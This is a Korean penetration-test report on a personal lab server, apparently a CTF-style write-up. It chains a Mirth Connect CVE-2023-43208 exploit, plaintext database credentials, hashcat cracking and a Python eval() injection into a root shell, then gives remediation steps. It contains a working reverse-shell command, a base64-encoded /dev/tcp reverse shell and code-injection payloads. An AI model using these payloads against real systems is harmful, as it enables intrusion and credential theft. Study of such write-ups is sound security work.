---
publish: true
title: 모의해킹 보고서 - lab20
created: 2026-11-17
modified: 2026-11-20T16:43:23.647Z
published: 2026-11-17
date: 2026-11-17
tags:
description:
lab: lab20
---

## 목차

1. [개요](#1-개요)
2. [총평](#2-총평)
3. [정보 수집 대상](#3-정보-수집-대상)
4. [진단결과 요약](#4-진단결과-요약)
5. [모의해킹 수행 내용](#5-모의해킹-수행-내용)
6. [취약점](#6-취약점)

## 1. 개요

본 보고서는 2026년 11월 17일에 진행된 lab20에 대한 모의해킹 보고서이다.

## 2. 총평

이번 lab20 모의해킹에서는 취약점이 노출된 Mirth Connect 버전, 평문 노출된 DB 인증 정보, root 권한으로 실행 가능한 취약점이 있는 Mirth Connect의 알림 서비스의 연계로 root로 권한 상승이 가능했다.
이는 외부에서 시작된 침해가 서버 전체에 대한 통제권 확보로 확대될 수 있음을 보여준다.

보완을 위해 `Mirth Connect` 버전을 업데이트하고

## 3. 정보 수집 대상

개인 실습 서버 lab20을 대상으로 취약점을 점검했다. 대상 서버 lab20의 IP는 자산 보호 차원에서 가려두었다.

## 4. 진단결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점' 섹션에서 확인할 수 있다.

| 취약점 이름                                         | 위험도 | 설명                                                                                                                                | 대응방안                                                                                     |
| :--------------------------------------------- | :-: | :-------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------- |
| 취약점이 노출된 Mirth Connect 버전                      | 최상  | Mirth Connect 4.4.0 버전에 CVE-2023-43208 취약점이 노출                                                                                    | 취약점이 패치된 버전으로 업데이트                                                                       |
| 평문 노출된 DB 인증 정보                                | 최상  | 권한 제한 없는 `Mirth properties` 파일에 데이터베이스 크리덴셜 정보가 평문으로 노출                                                                           | `Mirth properties` 파일에 최소 권한 제한<br><br>노출된 인증 정보는 변경                                     |
| root 권한으로 실행 가능한 취약점이 있는 Mirth Connect의 알림 서비스 | 최상  | 사용자 정보가 포함된 문자열이 `eval()` 식으로 들어가고, 식의 내용이 root의 권한으로 Python으로 해석되고 계산<br><br>`base64`로 인코딩 된 리버스쉘을 디코딩하고 해석하도록 코드를 넣어서 원격 접속에 성공 | 사용자 정보가 포함된 문자열이 `eval()` 식으로 넘어가지 않게 막음<br><br>필요한 계산은 미리 사용자 정보 단에서 하고 결과를 `eval()`로 넘 |

## 5. 모의해킹 수행 내용 

![[00. Setting/00. 첨부파일/Pasted image 20261117094353.png]]

대상 서버를 포트 스캔해보면 `SSH`, `HTTP`, `HTTPS`가 나온다.

![[00. Setting/00. 첨부파일/Pasted image 20261117100031.png]]

`-p-` -> 전체 포트 스캔 옵션을 더 해보니 `6661`까지 추가로 나왔다. 아직 무슨 포트인지는 모른다.

![[00. Setting/00. 첨부파일/Pasted image 20261117101039.png]]

서버의 웹 페이지를 들어가보니 `Mirth Connet` 서비스가 있고, `Launch Mirth Connect Administrator` 를 클릭해보면,

![[00. Setting/00. 첨부파일/Pasted image 20261117101200.png]]

`webstart.jnlp` 파일을 받을 수 있다.

`jnlp`: Java Network Launch Protocol 파일 확장자. 브라우저에서 Java 기반 프로그램을 실행하도록 연결 정보나 실행 옵션을 담는 파일.

![[00. Setting/00. 첨부파일/Pasted image 20261117101300.png]]

다운 받은 파일을 열어보면 `4.4.0` 버전의 서비스 임을 알 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261117101458.png]]

`4.4.0` 버전 취약점을 검색해보니 취약점이 있다. 인증 없이 원격으로 임의 코드를 실행할 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261117101909.png]]

깃허브에서 `PoC`를 다운 받는다.

![[00. Setting/00. 첨부파일/Pasted image 20261117102043.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117102156.png]]

`4.4.1` 이하 버전에서 동작하는 취약점이고, `exploit.py`를 실행하면서 실행할 명령을 붙일 수 있다. 리버스쉘도 연결할 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261118024724.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117102617.png]]

```
python3 exploit.py shell -t https://[MASK]:443 --lhost [Mask] --lport 4444
```

대기 중인 4444 포트로 리버스쉘을 연결해준다. 연결에 성공했고 사용자 이름은 `mirth`이다.

![[00. Setting/00. 첨부파일/Pasted image 20261117103308.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117103214.png]]

`mirth connect`의 설정을 찾아본다. 속성 파일이 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261117104423.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117104646.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117103342.png]]

database에 대한 정보들이 있다.

```
database = mysql
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

![[00. Setting/00. 첨부파일/Pasted image 20261117103739.png]]

셸 안정화를 해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261117104855.png]]

```
mysql -h 127.0.0.1 -P 3306 -u mirthdb -p mc_bdd_rod
Enter password: MirthPass123!
```

앞서 얻은 정보들로 `mysql`에 접속한다.

![[00. Setting/00. 첨부파일/Pasted image 20261117105146.png]]

`SHOW TABLES;` 로 테이블 확인.

![[00. Setting/00. 첨부파일/Pasted image 20261117105239.png]]

`DESCRIBE PERSON;` 등록된 사용자를 찾아본다.

![[00. Setting/00. 첨부파일/Pasted image 20261117105307.png]]

`SELECT USERNAME FROM PERSON;` 사용자 이름으로 `sedric`을 찾았다.

![[00. Setting/00. 첨부파일/Pasted image 20261117110901.png]]

이번엔 비밀번호를 찾아본다.
`u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`

![[00. Setting/00. 첨부파일/Pasted image 20261117114417.png]]

`Mirth Connect`의 공식 페이지에서 기본 `Digest Algorithm`이 바뀌었다는 공지가 있다. `SHA256` -> `PBKDF2WithHmacSHA256`

![[00. Setting/00. 첨부파일/Pasted image 20261117113720.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117113843.png]]

`Mirth Connect 4.4.0` 의 비밀번호 해시를 크랙킹하는 방법을 설명하는 깃허브 페이지를 찾았다.

후보 비밀번호가 있을 때 단순 `SHA256`은 솔트(8 Bytes)와 함께 비밀번호를 `SHA256` 계산에 넣고 그 계산을 1000번 반복해 확인하지만 `PBKDF2-WithHmac-SHA256`은 `Hmac-SHA256`계산으로 600000번 반복한다.

비밀번호를 크랙킹하려면 솔트와 비밀번호 해시를 분리하고 `hashcat`에

```
sha256:600000:<base64-salt>:<base-hash>
```

를 10900 모드로 넣어준다.

![[00. Setting/00. 첨부파일/Pasted image 20261117143705.png]]

```
echo "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==" | base64 -d | wc -c

40
```

해시를 `base64`로 디코딩 후 몇 Bytes 인지 알아낸다.

```
echo "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==" | base64 -d | head -c 8 | base64

u/+LBBOUnac=
```

솔트는 8 Bytes라 했으니 디코딩 후 앞에서 8 Bytes 만큼의 내용을 읽어 다시 `base64`로 만든다.

```
echo "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==" | base64 -d | tail -c 32 | base64

YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

전체 Bytes가 40이라 했으니 솔트 8 Bytes를 제외한 나머지 32 Bytes가 비밀번호가 된다.

만약 전체 Bytes를 모른다면 `tail -c +9`(9 Bytes부터 읽기)로 해도 된다.

![[00. Setting/00. 첨부파일/Pasted image 20261117114838.png]]

```
echo "sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=" > mirth.hash
```

앞의 정보들을 형식 `sha256:600000:<base64-salt>:<base-hash>`에 맞춰 넣어 파일을 만들어주고,

![[00. Setting/00. 첨부파일/Pasted image 20261117114930.png]]

```
hashcat -m 10900 mirth.hash ~/Desktop/rockyou.txt
```

![[00. Setting/00. 첨부파일/Pasted image 20261117143840.png]]

비밀번호 크랙킹에 성공했다. `snowflake1`

![[00. Setting/00. 첨부파일/Pasted image 20261121010747.png]]

`SSH`에 `sedric` 사용자 이름으로 접속했고, 성공했다.

![[00. Setting/00. 첨부파일/Pasted image 20261117145300.png]]

서비스 포트 목록을 확인했더니 외부 스캔에서는 보이지 않았던 로컬 포트가 하나 더 있다. `54321`

![[00. Setting/00. 첨부파일/Pasted image 20261117145457.png]]

```
find / -type f -user root -name '*.py' 2>/dev/null | grep -i 'noti'
```

`mirth connect`에는 `python` 코드로 짜여진 알림 서비스가 있다.
`root`의 권한으로 실행 가능한 `python` 파일이 있나 확인해본다.

![[00. Setting/00. 첨부파일/Pasted image 20261117145659.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117150030.png]]

`Mirth Connect`의 서비스를 찾았고, 이 서비스가 `54321`포트를 쓰고 있다는 걸 알았다.

![[00. Setting/00. 첨부파일/Pasted image 20261117151459.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117151525.png]]

```
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
```

Flask 웹 서버를 만들고 요청을 처리하는 데 필요한 모듈을 가져온다. xml.etree.ElementTree는 XML을 읽고, os는 파일 경로와 디렉터리를 다룬다.

```
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)
```

알림 파일을 저장할 폴더를 지정한다. 폴더가 없으면 생성한다.

```
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```

`template()`은 이름(first, last), 발신 앱, 시간(ts), 생년월일(dob), 성별을 받는다. 정규식(r"...")은 각 값에 허용할 문자를 정한다.

| 부분             | 뜻                                   |
| -------------- | ----------------------------------- |
| r"..."         | Python의 raw 문자열 표기. 정규식에 쓰는 `\`를 보존 |
| ^              | 문자열 시작                              |
| \[...]          | 대괄호 안의 문자 중 하나                      |
| a-zA-Z0-9      | 영문 소문자·대문자·숫자                       |
| `._'\"(){}=+/` | 허용하는 특수문자: . \_ ' " ( ) { } = + /    |
| +              | 앞의 허용 문자가 1개 이상                     |
| \$              | 문자열 끝.                              |
`정규식(정규 표현식)`: 일정한 패턴에 맞는 글자를 찾는 검색 규칙

```
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
```

여섯 입력값이 모두 정규식에 맞는지 검사. 하나라도 벗어나면 `[INVALID_INPUT]` 을 돌려준다.

```
	# DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
        except:
	        return "[INVALID_DOB]"
```

생년월일에서 연도를 뽑아 현재 연도와 비교한다. 오류가 나거나 범위를 벗어나면 `[INVALID_DOB]`을 돌려준다.

```
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
```

이 줄은 바깥쪽 `f-string`으로 `first`, `last` 같은 값을 문장에 넣는다. `{{...}}`처럼 중괄호를 두 번 쓴 부분은 이 단계에서 실제 중괄호 하나로 남겨 둔다.
-> 그래서 결과 문자열에 `{datetime.now().year - year_of_birth}`가 들어간다.

`f-string`: Python에서 문자열 안에 변수나 계산 결과를 넣는 문법

```
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"  
```

다음 줄에서 결과 문자열을 다시 `f-string`으로 `eval()`한다. 이때 남아 있던 중괄호 안의 내용이 Python 표현식으로 평가된다. 사용자 입력에도 중괄호가 허용되므로, 입력이 단순한 이름으로만 취급되지 않고 표현식으로 실행될 수 있다.

`eval()`: evaluate. 문자열을 Python 표현식으로 해석해서 실행하고, 그 결과를 돌려주는 함수
`표현식`:  계산하거나 값을 만들어 내는 코드 조각

```
@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
        
```

`/addPatient`에 POST 요청이 오면 실행되고 요청이 서버 자신의 주소인 `127.0.0.1`에서 오지 않으면 거부한다.

```
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    
```

요청 본문을 문자열로 읽고 XML 문서로 파싱한다. 잘못된 XML이면 `XML ERROR`를 돌려준다.
XML에서 `firstname`, `lastname`, `sender_app`, `timestamp`, `birth_date`, `gender` 값을 꺼내 `data`에 담는다.

`파싱`: parsing. 글자나 코드를 규칙에 따라 읽고 그 구조를 알아내는 것.

```
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

최종 알림 내용의 메세지와, 앱이 실행되는 환경이 적혀있다.

\=> 자신의 주소에서 요청하는 `XML`형식을 읽고, 내용의 값들을 꺼내 `data`에 담고 `template`에 입력하면 `eval()` 식이 괄호 안 `{template}`의 값을 해석하고 계산해서 실행한다. 최종 알림 내용도 더해 출력한다.

![[00. Setting/00. 첨부파일/Pasted image 20261117151433.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261117151715.png]]

```
python3 - <<'PY'
from urllib.request import Request, urlopen

xml = """<patient>
<firstname>{1+1}</firstname>
<lastname>User</lastname>
<sender_app>Test</sender_app>
<timestamp>20261117123000</timestamp>
<birth_date>01/01/2000</birth_date>
<gender>M</gender>
</patient>"""

req = Request(
    "http://127.0.0.1:54321/addPatient",
    data=xml.encode(),
    headers={"Content-Type": "application/xml"},
    method="POST",
)

with urlopen(req) as response:
    print(response.status)
    print(response.read().decode())
PY
```

`xml` 형식을 짜고 요청을 보내는 python 코드를 만들어 실험 삼아 `firstname`의 내용을 `{1+1}`로 넣어본다.
`Patient 2 User (M), 26 years old, recieved from Test at 20261117123000`
이 최종 출력 됐다. `template`의 내용인 `1+1`이 계산 됐음을 알 수 있다.

\*이 코드는 `python3 -c 'import urllib.requrest url=http://127.0.0.1:54321~~~'`  한 줄 명령과 같다. 왜 굳이 입력값으로 쓰는가?
\=> 저렇게 쓰면 쌍따옴표 홑따옴표를 자유롭게 쓸 수 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261117151947.png]]

`{__import__('os').popen('id').read()}`를 넣어보면 명령어가 실행됨을 알 수 있다. `root`의 권한으로 실행됐음을 확인했다.

![[00. Setting/00. 첨부파일/Pasted image 20261117171020.png]]

리버스쉘을 `base64`로 인코딩해서 결과를 한 줄로 만든다.

![[00. Setting/00. 첨부파일/Pasted image 20261117170916.png]]

```
python3 - <<'PY'
from urllib.request import Request, urlopen

xml = """<patient>
<firstname>{__import__('os').system(__import__('base64').b64decode('YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS43Ni80NDMgMD4mMSc=').decode())}</firstname>

```

`base64`로 인코딩한 리버스쉘을 디코딩할 수 있게 코드를 넣어주면,

![[00. Setting/00. 첨부파일/Pasted image 20261117170755.png]]

대기해놓은 포트에서 `root` 셸이 연결되어 최고 권한 탈취에 성공했다.

## 6. 취약점

```
CVSS v4.0 점수: 10 / Critical
Macro vector: 000100
Exploitability: High
Complexity: High
Vulnerable system: High
Subsequent system: Medium
Exploitation: High
Security requirements: High
```

### 6.1  취약점이 노출된 Mirth Connect 버전

<br> **6.1.1 설명**

- Mirth Connect 4.4.0 버전에 CVE-2023-43208 취약점이 노출되어 있었다.
- 인증 없이 원격으로 리버스쉘을 연결해 서버에 접속이 가능했다.

<br>; **6.1.2 조치방법**

- 취약점이 패치된 버전으로 업데이트 한다.

### 6.2  평문 노출된 DB 인증 정보

<br> **6.2.1 설명**

- 권한 제한 없는 `Mirth properties` 파일에 데이터베이스 크리덴셜 정보가 평문으로 노출되어 있었다.
- 노출된 크리덴셜 정보로 `Maria DB`에 접근해 사용자 이름과 해시된 비밀번호를 찾을 수 있었다.

<br> **6.2.2 조치방법**

- `Mirth properties` 파일에 최소 권한 제한을 해준다.
- 노출된 인증 정보는 변경한다.

### 6.3  root 권한으로 실행 가능한 취약점이 있는 Mirth Connect의 알림 서비스

<br> **6.3.1 설명**

- 사용자 정보가 포함된 문자열이 `eval()` 식으로 들어가고, 식의 내용이 root의 권한으로 Python으로 해석되고 계산이 된다.
- `base64`로 인코딩 된 리버스쉘을 디코딩하고 해석하도록 코드를 넣어서 원격 접속에 성공했다.

<br> **6.3.2 조치방법**

- 사용자 정보가 포함된 문자열이 `eval()` 식으로 넘어가지 않게 막는다.
- 필요한 계산은 미리 사용자 정보 단에서 하고 결과를 `eval()`로 넘긴다.
